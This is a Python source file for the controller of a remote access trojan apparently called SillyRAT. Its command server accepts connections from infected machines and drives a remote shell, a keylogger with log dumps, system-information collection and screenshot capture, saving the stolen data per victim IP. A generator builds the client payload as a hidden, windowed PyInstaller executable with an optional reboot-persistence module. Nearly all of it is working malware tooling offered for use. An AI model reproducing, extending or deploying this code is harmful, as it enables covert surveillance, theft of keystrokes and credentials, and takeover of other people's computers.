import sys
import os
import socket
import time
import base64
import tabulate
import signal
import subprocess
import argparse
import shutil
import threading
import platform
import PyInstaller.__main__
from datetime import datetime

__LOGO__ = """
                                         @@@@@@@@@@@@@@@@                                           
                                      @@@@@@@@@@@@@@@@@@@@@@@                                       
                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@                                     
                                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                   
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                  
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                 
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                               
                                 @@@@@%%%@@@@@@@@@@@#+=+#@@@@@@@@@@@@                               
                                 @@@#-----#@@@@@@@+--::---*@@@@@@@@@@                               
                                 @@@-..:..:%@@@@@+. .-=-..:+@@@@@@@@@@                              
                                 @@#.*@@@+.+@@@@%:.-@@@@@-.:%@@@@@@@@@                              
                                 @@*:@@@@%:+@@@@#:.%@@@@@*..#@@@@@@@@@                              
                                 @@%.#@@@#==--:----+@@@@@- :@@@@@@@@@@                              
                                 @@@=.=*==-:::::--:::-++..:#@@@@@@@@@@                              
                                 @@@@====-::::::::::::::--+@@@@@@@@@@@                              
                                 @@%====-:::::::::::::::--:-#@@@@@@@@@                              
                                 @@====-::::::::::::::-====+@@@@@@@@@@@                             
                                 @@@*==-:::::::::::-=======+@@@@@@@@@@@@                            
                                 @@@#-====-------=======---*@@@@@@@@@@@@@                           
                                 @@@#--===============----:-*@@@@@@@@@@@@                           
                                @@@@%----==========-----:. .:#@@@@@@@@@@@@                          
                               @@@@@=.:--------------:..     .*@@@@@@@@@@@@                         
                              @@@@@.  ...:--------:...        .*@@@@@@@@@@@@                        
                            @@@@@%:        .....              ..%@@@@@@@@@@@@@                      
                          @@@@@@@:.                             :@@@@@@@@@@@@@@                     
                         @@@@@@@-.                               *@@@@@@@@@@@@@@@                   
                       @@@@@@@@*-.                         ..... -@@@@@@@@@@@@@@@@@                 
                      @@@@@@@@@=--:...              ..::--------:.*@@@@@@@@@@@@@@@@@                
                     @@@@@@@@@%---:...                ....:-------.:@@@@@@@@@@@@@@@@@               
                    @@@@@@@@@@-:.                           ..:----.:%@@@@@@@@@@@@@@@@              
                    @@@@@@@@@-..                               ..:--:.@@@@@@@@@@@@@@@@@             
                   @@@@@@@@@-.                                    ..:..@@@@@@@@@@@@@@@@@            
                   @@@@@@@@:                                        ...+@@@@@@@@@@@@@@@@            
                  @@@@@@@@-                                            -@@@@@@@@@@@@@@@@@           
                 @@@@@@@@*.                                            .%@@@@@@@@@@@@@@@@           
                 @@@@@@@@.                                             .#@@@@@@@@@@@@@@@@@          
                @@@@@@@@.                                               =@@@@@@@@@@@@@@@@@          
              @@@@@@@@@%                                                -@@@@@@@@@@@@@@@@@          
              @@@@@@@@@=                                                :@@@@@@@@@@@@@@@@@          
             @@@@@@@@@@-                                                :@@@@@@@@@@@@@@@@@          
             @@@@@@@@@@-                                                -@@@@@@@@@@@@@@@@@          
             @@@@@@@@@@-                                                +@@@@@@@@@@@@@@@@@          
              +==--=*@@%.                                           ... *@@@@@@@@@@@@@@@@           
             ==-:::::=#@@%:.                                      .---:-%@@@@@@@@@@@@@@@#-          
           ====-::::::-+@@@%-.                                    .--::-#@@@@@@@@@@@@@@=:--         
   ===========-:::::::::=%@@@@+.                                  .--::-=@@@@@@@@@@@@#=:::-         
 =====---==-:::::::::::::-#@@@@@#:                                .--::-==%@@@@@@@@*==::::-         
 ===-:::::::::::::::::::::-+@@@@@@%-.                             .---:-====+***====--::::--        
 ===-::::::::::::::::::::::-+@@@@@@@%:                            .-=-::-==========-:::::::-=       
 ====:::::::::::::::::::::::-=@@@@@@@@.                          .:==-::::--===---::::::::::---     
 =====::::::::::::::::::::::::+%@@@@@@:                         .=@+=-::::::::::::::::::::::::--==  
 =====:::::::::::::::::::::::::=%@@@*.                        .-%@@+=-::::::::::::::::::::::::::::-=
 =====::::::::::::::::::::::::::=+:                         .=%@@@@+=-::::::::::::::::::::::::::::-=
 ====-::::::::::::::::::::::::::-==-..                  ..-#@@@@@@@+==::::::::::::::::::::::::::--==
====-::::::::::::::::::::::::::::==+%+:..           ..-*%@@@@@@@@@@===:::::::::::::::::::::::--===  
====-::::::::::::::::::::::::::::===#@@@@#*=====+#%@@@@@@@@@@@@@@@@===:::::::::::::::::::--====     
=========----:::::::::::::::::::-===*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@===-::::::::::::::---=+=-        
 ==================--::::::::::-====#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@====-:::::::::--===#@            
    =====+===============----======*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+=====------====*%@              
            @@@@@%#*++===========*@@@@@                          #@@=============#@                 
                   @@@@@@%%%%%@@@@@@@                            @@@@#========#@@                   
                         @@@@@@@@@@                                 @@@@@@@@@@@                     

"""

__HELP_OVERALL__ = """usage: python3 sillyray.py command [--help] [--option OPTION]

These are the commands available for usage:

    bind        Run the Server on machine and establish connections
    generate    Generate the Payload file for target platform

You can further get help on available commands by supplying
'--help' argument. For example: 'python3 sillyrat generate --help'
will print help manual for generate commmand
"""

__HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind

The Bind command is used to bind the application on server
for incoming connections and control the clients through
the command interface
"""

__HELP_GENERATE__ = """
usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]

    Args              Description
    -h, --help        Show Help Manual for generate command
    -a, --address     IP Address of server. [Connect to]
    -p, --port        Port of connecting server
    -o, --output      Output file to generate
    -s, --source      Do not generate compiled code.
                      Gives Python source file.
        --persistence Auto start on reboot [Under Development]

The generate command generates the required payload
file to be executed on client side. The establish
connection to server and do commands.
"""

class PULL:

    WHITE = '\033[1m\033[0m'
    PURPLE = '\033[1m\033[95m'
    CYAN = '\033[1m\033[96m'
    DARKCYAN = '\033[1m\033[36m'
    BLUE = '\033[1m\033[94m'
    GREEN = '\033[1m\033[92m'
    YELLOW = '\033[1m\033[93m'
    RED = '\033[1m\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    LINEUP = '\033[F'

    def __init__(self):
        if not self.support_colors:
            self.win_colors()

    def support_colors(self):
        plat = sys.platform
        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
														'ANSICON' in os.environ)
        is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
        if not supported_platform or not is_a_tty:
            return False
        return True

    def win_colors(self):
        self.WHITE = ''
        self.PURPLE = ''
        self.CYAN = ''
        self.DARKCYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.BOLD = ''
        self.UNDERLINE = ''
        self.END = ''

    def get_menu_choice(self, mss=()):
        if mss:
            prompt = self.DARKCYAN + ">" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] "
        else:
            prompt = self.DARKCYAN + ">" + self.END + " "
        
        try:
            choice = input(prompt)
            return int(choice.strip())
        except ValueError:
            return -1

    def print(self, mess):
        print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)

    def function(self, mess):
        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)

    def error(self, mess):
        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)

    def exit(self, mess=""):
        sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)

    def logo(self):
        print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)

    def show_main_menu(self):
        print(self.CYAN + "\n┌─ Main Menu ─────────────────────────────────────┐" + self.END)
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "1." + self.END + " Show Sessions")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "2." + self.END + " Connect to Client")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "3." + self.END + " Disconnect from Current Client")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "0." + self.END + " Clear Screen")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "99." + self.END + " Exit")
        print(self.CYAN + "└─────────────────────────────────────────────────┘" + self.END)

    def show_client_menu(self):
        print(self.CYAN + "\n┌─ Client Menu ───────────────────────────────────┐" + self.END)
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "1." + self.END + " Show Sessions")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "2." + self.END + " Connect to Client")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "3." + self.END + " Disconnect from Current Client")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "4." + self.END + " Launch Shell")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "5." + self.END + " Keylogger Menu")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "6." + self.END + " System Information")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "7." + self.END + " Take Screenshot")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "0." + self.END + " Clear Screen")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "99." + self.END + " Exit")
        print(self.CYAN + "└─────────────────────────────────────────────────┘" + self.END)

    def show_keylogger_menu(self):
        print(self.CYAN + "\n┌─ Keylogger Menu ────────────────────────────────┐" + self.END)
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "1." + self.END + " Turn Keylogger ON")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "2." + self.END + " Turn Keylogger OFF")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "3." + self.END + " Dump Keylogs")
        print(self.CYAN + "│" + self.END + " " + self.BOLD + "0." + self.END + " Back to Client Menu")
        print(self.CYAN + "└─────────────────────────────────────────────────┘" + self.END)

    def help_overall(self):
        global __HELP_OVERALL__
        print(__HELP_OVERALL__)
        sys.exit(0)

    def help_bind(self):
        global __HELP_BIND__
        print(__HELP_BIND__)
        sys.exit(0)

    def help_generate(self):
        global __HELP_GENERATE__
        print(__HELP_GENERATE__)
        sys.exit(0)

pull = PULL()

class CLIENT:

    STATUS = "Active"
    MESSAGE = ""
    KEY     = ")J@NcRfU"

    def __init__(self, sock, addr):
        self.sock    = sock
        self.ip      = addr[0]
        self.port    = addr[1]

    def acceptor(self):
        data = ""
        chunk = ""

        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                self.STATUS = "Disconnected"
                break
            data += chunk.decode('utf-8')
            if self.KEY.encode('utf-8') in chunk:
                try:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
                except UnicodeDecodeError:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
                if not self.MESSAGE:
                    self.MESSAGE = " "
                data = ""

    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True
        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))

    def recv_data(self):
        while not self.MESSAGE:
            try:
                pass
            except KeyboardInterrupt:
                break
        rtval = self.MESSAGE
        self.MESSAGE = ""
        return rtval

class COMMCENTER:

    CLIENTS = []
    COUNTER = 0
    CURRENT = ()    #### Current Target Client ####
    KEYLOGS = []

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client
        return False

    def c_connect(self):
        if not self.CLIENTS:
            pull.error("No clients available!")
            return
        
        self.c_sessions()
        print("\nEnter client ID to connect:")
        try:
            client_id = int(input("> "))
            tgt = self.get_valid(client_id)
            if tgt:
                self.CURRENT = tgt
                pull.print(f"Connected to client {client_id}")
            else:
                pull.error("No client is associated with that ID!")
        except ValueError:
            pull.error("Invalid ID format!")

    def c_disconnect(self):
        if self.CURRENT:
            pull.print("Disconnected from current client")
            self.CURRENT = ()
        else:
            pull.error("No active connection!")

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_shell(self):
        result = ""
        if self.CURRENT:
            sys.stdout.write("\n")
            pull.print("Shell launched. Type 'exit' to return to menu.")
            while True:
                val = input("# ")
                val = "shell:" + val.rstrip(" ").lstrip(" ")

                if val:
                    if val != "shell:exit":
                        self.CURRENT[1].send_data(val)
                        result = self.CURRENT[1].recv_data()
                        if result.strip(" "):
                          print(result)
                    else:
                        break
        else:
            pull.error("You need to connect to a client first!")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)

    def handle_keylogger_menu(self):
        if not self.CURRENT:
            pull.error("You need to connect to a client first!")
            return

        while True:
            pull.show_keylogger_menu()
            choice = pull.get_menu_choice(self.CURRENT)
            
            if choice == 1:
                self.CURRENT[1].send_data("keylogger:on")
                result = self.CURRENT[1].recv_data()
                if result.strip(" "):
                    pull.print(result)
            elif choice == 2:
                self.CURRENT[1].send_data("keylogger:off")
                result = self.CURRENT[1].recv_data()
                if result.strip(" "):
                    pull.print(result)
            elif choice == 3:
                self.CURRENT[1].send_data("keylogger:dump")
                result = self.CURRENT[1].recv_data()
                dirname = os.path.dirname(__file__)
                dirname = os.path.join( dirname, 'keylogs' )
                if not os.path.isdir(dirname):
                    os.mkdir(dirname)
                dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                if not os.path.isdir(dirname):
                    os.mkdir(dirname)
                fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
                fl = open( fullpath, 'w' )
                fl.write( result )
                fl.close()
                pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
            elif choice == 0:
                break
            else:
                pull.error("Invalid choice!")

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
            pull.error("You need to connect to a client first!")

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("screenshot:")
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join( dirname, 'screenshots' )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
            fl = open( fullpath, 'wb' )
            fl.write( result )
            fl.close()
            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
        else:
            pull.error("You need to connect to a client first!")

    def c_exit(self):
        sys.stdout.write("\n")
        pull.exit("See Ya!\n")

class INTERFACE(COMMCENTER):

    SOCKET  = None
    RUNNER  = True

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            pull.print("Successfuly Bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            pull.exit("Unable to bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    def launch(self):
        pull.print("Launching Interface! Use the menu to navigate.\n")

        while True:
            if self.CURRENT:
                pull.show_client_menu()
                choice = pull.get_menu_choice(self.CURRENT)
                
                if choice == 1:
                    self.c_sessions()
                elif choice == 2:
                    self.c_connect()
                elif choice == 3:
                    self.c_disconnect()
                elif choice == 4:
                    self.c_shell()
                elif choice == 5:
                    self.handle_keylogger_menu()
                elif choice == 6:
                    self.c_sysinfo()
                elif choice == 7:
                    self.c_screenshot()
                elif choice == 0:
                    self.c_clear()
                elif choice == 99:
                    self.c_exit()
                else:
                    pull.error("Invalid choice! Please select a valid option.")
            else:
                pull.show_main_menu()
                choice = pull.get_menu_choice()
                
                if choice == 1:
                    self.c_sessions()
                elif choice == 2:
                    self.c_connect()
                elif choice == 3:
                    self.c_disconnect()
                elif choice == 0:
                    self.c_clear()
                elif choice == 99:
                    self.c_exit()
                else:
                    pull.error("Invalid choice! Please select a valid option.")

    def close(self):
        self.SOCKET.close()

class GENERATOR:

    data = ""
    flname = ""

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port
        self.source  = prs.source
        self.persistence = prs.persistence
        self.output  = self.get_output(prs.output)
        self.pather  = self.get_path()
        self.v_imports = self.get_imports()
        self.v_consts  = self.get_consts()
        self.v_persistence = self.get_persistence()
        self.v_sysinfo = self.get_sysinfo()
        self.v_screenshot = self.get_screenshot()
        self.v_client  = self.get_client()
        self.v_main    = self.get_main()

    def get_output(self, out):
        rtval = ""
        if self.source:
            if not out.endswith(".py"):
                rtval = (out + ".py")
            else:
                rtval = out
        else:
            if platform.system() == "Windows":
                if not out.endswith(".exe"):
                    rtval = (out + ".exe")
                else:
                    rtval = out
            elif platform.system() == "Linux":
                rtval = (out)
            else:
                pull.exit("Unrecognized Platform")

        return rtval

    def get_path(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname)
        if os.path.isdir(dirname):
            return dirname
        else:
            pull.exit("Files missing to generate the payload!")

    def get_imports(self):
        topen = os.path.join(self.pather, 'imports.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_consts(self):
        data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
        return data

    def get_persistence(self):
        topen = os.path.join(self.pather, "persistence.py")
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_sysinfo(self):
        topen = os.path.join(self.pather, 'sysinfo.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_screenshot(self):
        topen = os.path.join(self.pather, 'screenshot.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_client(self):
        topen = os.path.join(self.pather, 'client.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_main(self):
        topen = os.path.join(self.pather, 'main.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def tmp_dir(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'tmp')

        if not os.path.isdir(dirname):
            os.mkdir(dirname)

        fname   = os.path.join(dirname, 'cl.py')

        return (dirname, fname, 'cl.py')

    def patch(self):
        time.sleep(2)
        pull.function("Compiling modules ... ")
        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        pull.function("Generating source code ...")
        fl = open(self.output, 'w')
        fl.write(self.data)
        fl.close()
        time.sleep(2)
        pull.print("Code generated successfully!")
        pull.print("File: " + self.output)

    def generate(self):
        time.sleep(2)
        pull.function("Compiling modules ... ")
        self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        pull.function("Generating one time code for binary ")
        self.flname = self.tmp_dir()
        fl = open(self.flname[1], 'w')
        fl.write(self.data)
        fl.close()
        pull.print("Code generated successfully!")

    def compile(self):
        pull.function("Compiling generated code /\\")
        counter = 1

        t = threading.Thread(target=PyInstaller.__main__.run, args=([
            '--name=%s' % os.path.basename(self.output),
            '--onefile',
            '--windowed',
            '--log-level=ERROR',
            '--distpath=%s' % os.path.dirname(self.output),
            '--workpath=%s' % self.flname[0],
            os.path.join(self.flname[0], self.flname[2])
        ],),)
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
            time.sleep(1)
            counter += 1

        sys.stdout.write("\n")
        pull.print("Compiled Successfully!")

    def clean(self):
        pull.function("Cleaning files and temporary codes")
        shutil.rmtree(self.flname[0])
        pull.print("File: " + self.output)

class PARSER:

    COMMANDS = ['bind', 'generate']

    def __init__(self, prs):
        self.mode    = self.v_mode(prs.mode, prs.help)
        self.help    = self.v_help(prs.help)

        if self.mode == "bind":
            self.address = self.v_address(prs.address)
            self.port    = self.v_port(prs.port)
        elif self.mode == "generate":
            self.address = self.v_address(prs.address)
            self.port    = self.v_port(prs.port)
            self.output  = self.v_output(prs.output)
            self.source  = prs.source
            self.persistence = prs.persistence

    def v_help(self, hl):
        if hl:
            if not self.mode:
                pull.help_overall()
            else:
                if self.mode == "bind":
                    pull.help_bind()
                elif self.mode == "generate":
                    pull.help_generate()
                else:
                    pull.help_help()

    def v_address(self, str):
        return str

    def v_port(self, port):
        if not port:
            pull.exit("You need to Supply a Valid Port Number")

        if port <= 0 or port > 65535:
            pull.exit("Invalid Port Number")

        return port

    def v_mode(self, val, hl):
        if val:
            if val in self.COMMANDS:
                return val
            else:
                pull.exit("No such command found in database")
        else:
            if not hl:
                pull.exit("Invalid Syntax. Refer to the manual!")

    def v_output(self, val):
        if val:
            if os.path.isdir(os.path.dirname(val)):
                return val
            else:
                pull.exit("Directory doesn't exist!")
        else:
            pull.exit("You must provide an output Path!")

def main():
    pull.logo()

    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument('mode', nargs="?", help="Moder")
    parser.add_argument('-h', '--help'   , dest="help"   , default=False, action="store_true", help="Help Manual")
    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
    parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
    parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
    parser.add_argument('-s', '--source' , dest="source" , default=False, action="store_true", help="Source file")
    parser.add_argument('--persistence'  , dest="persistence", default=False, action="store_true", help="Persistence")

    parser = parser.parse_args()

    parser = PARSER(parser)

    if parser.mode == "bind":
        iface = INTERFACE(parser)
        iface.bind()
        iface.accept()
        iface.launch()
        iface.close()
    elif parser.mode == "generate":
        pull.function("Starting Generator Mode!")
        generator = GENERATOR(parser)
        if generator.source:
            generator.patch()
        else:
            generator.generate()
            generator.compile()
            generator.clean()
        pull.function("Done")

if __name__ == "__main__":
    main()
